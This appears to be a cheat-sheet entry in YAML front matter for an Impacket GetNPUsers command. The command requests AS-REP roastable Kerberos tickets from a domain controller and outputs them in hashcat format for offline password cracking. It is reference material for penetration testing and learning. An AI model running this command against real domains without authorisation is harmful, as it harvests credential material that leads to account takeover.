---
title: "Impacket GetNPUsers Basic Request"
date: 2024-05-23T10:00:00Z
command: |
    impacket-GetNPUsers -dc-ip 10.10.10.1 -format hashcat -request 'domain.local/'
tags: ["Kerberos", "TGT", "Enumeration", "Windows"]
description: "Basic request where no credentials are required and the TGT key is public"
draft: false
---